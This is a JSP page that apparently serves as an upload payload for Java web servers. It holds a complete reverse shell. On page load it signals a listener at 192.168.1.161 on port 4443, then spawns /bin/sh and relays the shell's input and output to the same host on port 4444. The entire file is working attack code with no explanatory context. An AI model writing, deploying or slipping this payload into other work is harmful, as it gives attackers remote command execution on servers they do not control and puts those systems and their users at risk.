<%@ page import="java.io.*, java.net.*" %>
<html>
    <body>
      <text>
        <%
        //thanks to chris (below) for the reverse shell
        //https://github.com/frohoff
        String host="192.168.1.161";
        int shell_port=4444;
        int landing_port=4443;
        String cmd="/bin/sh";
        try {
           Socket socket = new Socket(host, landing_port);
           InputStream inSocket = socket.getInputStream();
           OutputStream outSocket = socket.getOutputStream();
           String str = "wannashell?\n";
           byte buffer[] = str.getBytes();
           outSocket.write(buffer);
           socket.close();
        } catch (Exception e) {
        }
        try {
          Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,shell_port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
        } catch (Exception e) {
        }
        %>
      </text>
    </body>
</html>
